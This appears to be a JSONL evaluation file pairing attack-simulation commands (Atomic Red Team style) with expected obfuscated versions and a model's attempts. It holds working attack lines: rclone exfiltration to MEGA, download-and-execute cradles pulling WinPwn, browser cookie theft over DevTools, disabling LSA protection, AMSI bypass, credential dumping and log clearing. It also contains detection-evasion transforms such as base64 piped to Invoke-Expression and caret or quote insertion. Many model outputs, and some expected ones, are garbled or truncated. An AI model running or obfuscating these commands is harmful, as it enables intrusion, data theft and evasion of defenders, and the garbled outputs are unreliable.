{"input": "New-Item #{rclone_config_path}\\rclone -ItemType directory\nNew-Item #{rclone_config_path}\\rclone\\rclone.conf\ncd \"#{rclone_path}\"\n.\\rclone.exe config create #{remote_share} mega\nset-Content #{rclone_config_path}\\rclone\\rclone.conf \"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\"\n.\\rclone.exe copy --max-size 1700k \"#{dir_to_copy}\" #{remote_share}:test -v\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LUl0ZW0gI3tyY2xvbmVfY29uZmlnX3BhdGh9XHJjbG9uZSAtSXRlbVR5cGUgZGlyZWN0b3J5Ck5ldy1JdGVtICN7cmNsb25lX2NvbmZpZ19wYXRofVxyY2xvbmVccmNsb25lLmNvbmYKY2QgIiN7cmNsb25lX3BhdGh9IgouXHJjbG9uZS5leGUgY29uZmlnIGNyZWF0ZSAje3JlbW90ZV9zaGFyZX0gbWVnYQpzZXQtQ29udGVudCAje3JjbG9uZV9jb25maWdfcGF0aH1ccmNsb25lXHJjbG9uZS5jb25mICJbI3tyZW1vdGVfc2hhcmV9XSBgbiB0eXBlID0gbWVnYSBgbiB1c2VyID0gI3ttZWdhX3VzZXJfYWNjb3VudH0gYG4gcGFzcyA9ICN7bWVnYV91c2VyX3Bhc3N3b3JkfSIKLlxyY2xvbmUuZXhlIGNvcHkgLS1tYXgtc2l6ZSAxNzAwayAiI3tkaXJfdG9fY29weX0iICN7cmVtb3RlX3NoYXJlfTp0ZXN0IC12')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZSBPY3Rpb25zLlN0YXJ0QXVkaWVuY2UgKiAjeHBpcm9tcwpiCmFjaGluZyAtICIiPiAvdGVzdC5jb20tYWR"}
{"input": "Start-Process -FilePath \"C:Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\#{srserver_exe}\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6UHJvZ3JhbSBGaWxlcyAoeDg2KVxTcGxhc2h0b3BcU3BsYXNodG9wIFJlbW90ZVxTZXJ2ZXJcI3tzcnNlcnZlcl9leGV9Ig==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7cGF0aH0=')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndotnet -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn') dotnet -consoleoutput -noninteractive", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') dotnet -consoleoutput -noninteractive"}
{"input": "poweroff --reboot\n", "output_expected": "poweroff --reboot", "output_model": "\"po\"wer\"\"o\"\"f\"f\" --reboot"}
{"input": "rundll32.exe #{input_file}, StartW\n", "output_expected": "rundll32.exe StartW", "output_model": "rundll32 \"\\\"\"  \\\"\"\"\\\"\",\" StartW -noexit -f {input_file} --% -nologo -"}
{"input": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"\n", "output_expected": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFuZA==')) | Invoke-Expression\""}
{"input": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNkdC5leGUgL2lkIFBDV0RpYWdub3N0aWMgL3NraXAgZm9yY2UgL3BhcmFtICJJVF9MYXVuY2hNZXRob2Q9Q29udGV4dE1lbnUgSVRfQnJvd3NlRm9yRmlsZT0vLi4vLi4vJChjYWxjKS5leGUi')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnVuY3Rpb25zIC1QcmljZXNJbnRlcmFjdGlvblByb3BlcnRpZXMgLU9mZmljZSAtKC0yMDAwIC0xNjcwIGtleSAje"}
{"input": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n", "output_expected": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace [[;] -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output `n }}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Jy5zdGF0dXNfc3RhdGVtZW50c19jb2xvci5leGNsYWluIClvdC5qb2tlbnQoIkhlYWRldmluZ3VzZSB7dHJ1ZURpZ"}
{"input": "$edgePath64 = \"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\"\nif (Test-Path $edgePath64) {\n    $edgePath = $edgePath64\n} else {\n    # Check 32-bit Edge installation path\n    $edgePath32 = \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\n    if (Test-Path $edgePath32) {\n        $edgePath = $edgePath32\n    } else {\n        exit 1\n    }\n}\n& $edgePath --disable-gpu-sandbox --gpu-launcher=\"C:\\\\Windows\\\\System32\\\\calc.exe &&\"\nsleep 5\ntaskkill -f -im msedge.exe\ntaskkill -f -im calc.exe\ntaskkill -f -im win32calc.exe\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGVkZ2VQYXRoNjQgPSAiQzpcUHJvZ3JhbSBGaWxlc1xNaWNyb3NvZnRcRWRnZVxBcHBsaWNhdGlvblxtc2VkZ2UuZXhlIgppZiAoVGVzdC1QYXRoICRlZGdlUGF0aDY0KSB7CiAgICAkZWRnZVBhdGggPSAkZWRnZVBhdGg2NAp9IGVsc2UgewogICAgIyBDaGVjayAzMi1iaXQgRWRnZSBpbnN0YWxsYXRpb24gcGF0aAogICAgJGVkZ2VQYXRoMzIgPSAiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxNaWNyb3NvZnRcRWRnZVxBcHBsaWNhdGlvblxtc2VkZ2UuZXhlIgogICAgaWYgKFRlc3QtUGF0aCAkZWRnZVBhdGgzMikgewogICAgICAgICRlZGdlUGF0aCA9ICRlZGdlUGF0aDMyCiAgICB9IGVsc2UgewogICAgICAgIGV4aXQgMQogICAgfQp9CiYgJGVkZ2VQYXRoIC0tZGlzYWJsZS1ncHUtc2FuZGJveCAtLWdwdS1sYXVuY2hlcj0iQzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxjYWxjLmV4ZSAmJiIKc2xlZXAgNQp0YXNra2lsbCAtZiAtaW0gbXNlZGdlLmV4ZQp0YXNra2lsbCAtZiAtaW0gY2FsYy5leGUKdGFza2tpbGwgLWYgLWltIHdpbjMyY2FsYy5leGU=')) | Invoke-Expression\"", "output_model": "$edgePath64 = C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\nif (Test-Path $edgePath64) {\n$edgePath = $edgePath64\n} else {\n# Check 32-bit Edge installation path\n$edgePath32 = C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\nif (Test-Path $edgePath32"}
{"input": "Mount-DiskImage -ImagePath \"#{path_of_iso}\" -StorageType ISO -Access ReadOnly\n$keep = Get-Volume -FileSystemLabel \"AllTheThings\"\n$driveLetter = ($keep | Get-Volume).DriveLetter\n$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\"))\n$instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TW91bnQtRGlza0ltYWdlIC1JbWFnZVBhdGggIiN7cGF0aF9vZl9pc299IiAtU3RvcmFnZVR5cGUgSVNPIC1BY2Nlc3MgUmVhZE9ubHkKJGtlZXAgPSBHZXQtVm9sdW1lIC1GaWxlU3lzdGVtTGFiZWwgIkFsbFRoZVRoaW5ncyIKJGRyaXZlTGV0dGVyID0gKCRrZWVwIHwgR2V0LVZvbHVtZSkuRHJpdmVMZXR0ZXIKJGluc3RhbmNlID0gW2FjdGl2YXRvcl06OkNyZWF0ZUluc3RhbmNlKFt0eXBlXTo6R2V0VHlwZUZyb21DTFNJRCgie2MwOGFmZDkwLWYyYTEtMTFkMS04NDU1LTAwYTBjOTFmMzg4MH0iKSkKJGluc3RhbmNlLkRvY3VtZW50LkFwcGxpY2F0aW9uLlNoZWxsRXhlY3V0ZSgkZHJpdmVMZXR0ZXIrIjpcZG9jdW1lbnQubG5rIiwiIiwkZHJpdmVMZXR0ZXIrIjpcIiwkbnVsbCwwKQ==')) | Invoke-Expression\"", "output_model": "Mount-DiskImage -ImagePath \"\\\"^^s^p^a^c^e^h^o^l^i^n^g^-^d^o^t^N^e^w^-^I^S^O^8^6^4;^A^U^T^H^E^N^T^I^C"}
{"input": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} \"#{input_file}\"\n", "output_expected": "Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZSBTdHJpbmcgIiN7YWxsIiAtIC1jb25maXJtICIje3Byb2dyYW1taXQgfSAje3Byb2dyYW1taXRzLmNvbS"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /delete 1 /f", "output_model": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f"}
{"input": "if (-not (Test-Path \"#{file_to_delete}\")) { New-Item \"#{file_to_delete}\" -Force }\n& \"#{sdelete_exe}\" -accepteula \"#{file_to_delete}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWYgKC1ub3QgKFRlc3QtUGF0aCAiI3tmaWxlX3RvX2RlbGV0ZX0iKSkgeyBOZXctSXRlbSAiI3tmaWxlX3RvX2RlbGV0ZX0iIC1Gb3JjZSB9CiYgIiN7c2RlbGV0ZV9leGV9IiAtYWNjZXB0ZXVsYSAiI3tmaWxlX3RvX2RlbGV0ZX0i')) | Invoke-Expression\"", "output_model": "if (-not (Test-Path \"\\\"\"\"\") { New-Item \\\"\"\\\") { & \\\"\"sdelete_exe\\\"\" -accepteula \\\"\"\\\"\"\\\"\"\\\"\"<|endof"}
{"input": "Start-Process \"$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe\" #{pid}\n", "output_expected": "Start-Process \"$PathTo  A   t om   i  csFo  lder\\T 10   5  5\\bi  n \\ x 64\\r  e  d V an i t y   .e xe \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2Vjb25kIHRoZSBDdXN0b21lclRyYWNrIG9wdGlvbnMgLSAiJCh7c3Bhbi5jYWxs')) | Invoke-Expression\""}
{"input": "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n", "output_expected": "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiYWRtaW4ucGF0aHlfaXRlbS5leGUgL2xvY2FsX3JvbGVzIHRvdXNybC51c2VyaW5fbmFtZSI=')) | Invoke-Expression"}
{"input": "System.Management.Automation.AmsiUtils amsiInitFailed", "output_expected": "System.Management.Automation.AmsiUtils \\\"amsiIni\\\"tFailed", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TGF2ZVN0b3JlIHB1YmxpYyAtQ2xvYmFsIC9kdXAvcGVyc29u')) | Invoke-Expression\""}
{"input": "$devToolsPort = 9222\n$testUrl = \"https://www.google.com\"\nstop-process -name \"chrome\" -force -erroraction silentlycontinue\n$chromeProcess = Start-Process \"chrome.exe\" \"$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default\" -PassThru\nStart-Sleep 10\n$jsonResponse = Invoke-WebRequest \"http://localhost:$devToolsPort/json\" -UseBasicParsing\n$devToolsPages = ConvertFrom-Json $jsonResponse.Content\n$ws_url = $devToolsPages[0].webSocketDebuggerUrl\n$ws = New-Object System.Net.WebSockets.ClientWebSocket\n$uri = New-Object System.Uri($ws_url)\n$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()\n$GET_ALL_COOKIES_REQUEST = '{\"id\": 1, \"method\": \"Network.getAllCookies\"}'\n$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)\n$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length\n$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()\n$completeMessage = New-Object System.Text.StringBuilder\ndo {\n    $receivedBuffer = New-Object byte[] 2048\n    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length\n    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result\n    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)\n    $completeMessage.Append($receivedString)\n} while (-not $result.EndOfMessage)\n$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, \"Closing\", [System.Threading.CancellationToken]::None).Wait()\ntry {\n    $response = ConvertFrom-Json $completeMessage.ToString()\n    $cookies = $response.result.cookies\n} catch {\n    Write-Host \"Error parsing JSON data.\"\n}\nWrite-Host $cookies\nStop-Process $chromeProcess -Force", "output_expected": "$devToolsPort = 9222 $testUrl = https://www.google.com stop-process -name chrome -force -erroraction silentlycontinue $chromeProcess = Start-Process chrome.exe \"$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default\" -PassThru Start-Sleep 10 $jsonResponse = Invoke-WebRequest http://localhost:$devToolsPort/json -UseBasicParsing $devToolsPages = ConvertFrom-Json $jsonResponse.Content $ws_url = $devToolsPages[0].webSocketDebuggerUrl $ws = New-Object System.Net.WebSockets.ClientWebSocket $uri = New-Object System.Uri($ws_url) $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait() $GET_ALL_COOKIES_REQUEST = '{\"id\": 1, \"method\": \"Network.getAllCookies\"}' $buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST) $segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait() $completeMessage = New-Object System.Text.StringBuilder do { $receivedBuffer = New-Object byte[] 2048 $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count) $completeMessage.Append($receivedString) } while (-not $result.EndOfMessage) $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, \"Closing\", [System.Threading.CancellationToken]::None).Wait() try { $response = ConvertFrom-Json $completeMessage.ToString() $cookies = $response.result.cookies } catch { Write-Host \"Error parsing JSON data.\" } Write-Host $cookies Stop-Process $chromeProcess -Force", "output_model": "powershell.exe \"-NoProfile\" \"-Command\" \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLXFjY2VzcyAtbGljZW5zZSB7ZGVmIGJlYWRvbmFsICNpbmRleCAiZnJvbSAje3BhdGggOiAxMTMwLCAnc"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt -officeProduct Word -sub ClearLogs", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmlsZSBHbG9iYWxSdW5uIEtleSAje3BhcnNlbmVyIGEgLUFwcGxpY2F0aW9uIC1CQjozMyAicGxhdGVyX2JveF9"}
{"input": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"#{output_folder}\"\n", "output_expected": "PathToAtomicsFolder..ExternalPayloadsnanodump.x64.exe", "output_model": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"\\\"\\\"\"\\\"\\\"\\\"\"\\\"\\\"<"}
{"input": "$PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe -debug\n", "output_expected": "\"$PathToAtomicsFolder\\T1055\\bin\\x64\\EtwpCreateEtwThread.exe\" -debug", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JEFsb2NhbGhSZXF1aXJlU3RhdHVzIC9wYWNrZWQgL2IvZmlsZSAiIC9wdWxsYS5leGU=')) | Invoke-Expression\""}
{"input": "Set-Content -Path \"#{File_to_Encrypt_Location}\" -Value \"populating this file with some text\"  # Create the test.txt file again in case prereqs failed\ncmd /c \"`\"C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe`\" --passphrase 'SomeParaphraseBlah' --batch --yes -c `\"#{File_to_Encrypt_Location}`\"\"\n", "output_expected": "Set-Content -Path", "output_model": "Set-Content -Path \\\"\\\"\\\"\\\".txt -Value \\\"populating this file with some text\\\" cmd /c `\"`\"C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe`\" --passphrase 'SomeParaphraseBlah' --batch --yes -c `\".txt`\"<"}
{"input": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\n", "output_expected": "G et-  Ch   il  dI   te   m -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC1TZWFyY2ggQmFzaA==')) | Invoke-Expression\""}
{"input": "certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt", "output_expected": "certutil.exe --urlcacherl-cache --force {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiV2luZG93cw==')) | Invoke-Expression\""}
{"input": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}\n", "output_expected": "odbcconf.exe /S /A {REGSVR \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnN0YWxsIHhtbG5zOiNkZXYje2xldmVsX3BvcnQgLWFjY291bnRfaW5wdXRfYmluLlJlbGVhc2U=')) | Invoke-Expression\"<"}
{"input": "cat /etc/security/pwquality.conf\n", "output_expected": "c a  t    /etc/security/pwquality.conf", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlc1xleGUgLW90ZXJvY2tpbmcuICR7dHlwZT5leGUuIE1hbiAiQmFzaWMgc3BhdCAtIHtmaWxlfSI=')) | Invoke"}
{"input": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f\n", "output_expected": "r  eg   add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgI2NsaWVudCAiU2FmYXJpYyBjZXRhdHVzIC1CIC9QbGFuIC1MIC1TZWN1cmVzIChEaWFsb2dpbiAjeWFub"}
{"input": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}", "output_expected": "\\\"m\\\"\\\"m\\\"\\\"c\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" -Embedding {PATH_ABSOLUTE:.msc}", "output_model": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}"}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /f\n", "output_expected": "reg add HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f reg delete HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI /v DisableAIDataAnalysis /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBQbGVhc2UgIiN7ZXhlIC9QYWdlLmF1dGggInRyYWNrIHR5cGUgLWRldmljZSBJbnN0cnVjdCwgc3VkbyBlbm"}
{"input": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path $path -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABwAGEAdABoACAAPQAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABDAG8AbQBtAGEAbgBkACAAUAByAG8AYwBlAHMAcwBvAHIAIgAKAGkAZgAgACgAIQAoAFQAZQBzAHQALQBQAGEAdABoACAALQBwAGEAdABoACAAJABwAGEAdABoACkAKQB7AAoAIAAgAE4AZQB3AC0ASQB0AGUAbQAgAC0ASQB0AGUAbQBUAHkAcABlACAASwBlAHkAIAAtAFAAYQB0AGgAIAAkAHAAYQB0AGgACgB9AAoATgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACQAcABhAHQAaAAgAC0ATgBhAG0AZQAgACIAQQB1AHQAbwBSAHUAbgAiACAALQBWAGEAbAB1AGUAIAAiACMAewBjAG8AbQBtAGEAbgBkAH0AIgAgAC0AUAByAG8AcABlAHIAdAB5AFQAeQBwAGUAIAAiAFMAdAByAGkAbgBnACIA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JWRhdGEtY29sb3VyIiAje1NvdXJjZUNvbnRlbnQtYnkgdGFza2luZw==')) | Invoke-Expression\""}
{"input": "kubectl get cronjobs -n #{namespace}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('a3ViZWN0bCBnZXQgY3JvbmpvYnMgLW4gI3tuYW1lc3BhY2V9')) | Invoke-Expression\"", "output_model": "\"get\" \"cronjobs\" \"-n\"   \"\"  kubectl   get cronjobs -n       {spacer}   {spacer}   {spacer}<|"}
{"input": "Gpscript /startup", "output_expected": "Gpscript \"/sta\"rtup", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0QXRv')) | Invoke-Expression\"\nGpscript /startup"}
{"input": "verclsid.exe /S /C {CLSID}", "output_expected": "ve^r,cls,i^d.e;x,e /S /C {CLSID}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzdFN1YnNjcmlwdHMgLXBvb2w6IC93aGVybCB7')) | Invoke-Expression\""}
{"input": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n", "output_expected": "un\"set\" HISTFILE export HISTFILESIZE=0 history -c", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvZnRhYmxlIC1zbGljZSBQYXJhbnQgLW9yZGVyIGFuZCAtIHRpbWVvdXRPbmx5fSAwMDAwMjAwMDAgU2ltcGxl"}
{"input": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n", "output_expected": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW9kZXJlc2VzOiN7YmFzaCAje3ByaW5nfQ==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive  ", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFMAMwBjAHUAcgAzAFQAaAAxAHMAUwBoADEAdAAvAFcAaQBuAFAAdwBuAC8AMQAyADEAZABjAGUAZQAyADYAYQA3AGEAYwBhADMANgA4ADgAMgAxADUANgAzAGMAYgBlADkAMgBiADIAYgA1ADYAMwA4AGMANQA3ADcAMwAvAFcAaQBuAFAAdwBuAC4AcABzADEAJwApAAoAUwBoAGEAcgBwAEMAbABvAHUAZAAgAC0AYwBvAG4AcwBvAGwAZQBvAHUAdABwAHUAdAAgAC0AbgBvAG4AaQBuAHQAZQByAGEAYwB0AGkAdgBlAA==", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') SharpCloud -consoleoutput -noninteractive"}
